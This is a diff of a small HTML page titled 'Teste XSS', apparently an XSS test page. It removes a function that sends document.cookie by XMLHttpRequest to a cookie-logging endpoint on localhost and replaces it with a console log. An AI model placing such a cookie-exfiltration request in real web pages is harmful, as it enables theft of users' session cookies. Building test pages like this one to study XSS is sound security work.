@@ -1,17 +1,11 @@
 <!DOCTYPE html>
-<!DOCTYPE html>
+
 <html>
 <head>
   <title>Teste XSS</title>
   <script>
     function sendCookieToServer() {
-      // Cria o cookie
-      document.cookie = "user=teste; path=/";
-      
-      // Cria um objeto XMLHttpRequest para enviar o cookie via GET
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", "http://localhost:5000/log_cookie?cookie=" + encodeURIComponent(document.cookie), true);
-      xhr.send();
+     console.log(document.cookie);
     }
   </script>
 </head>
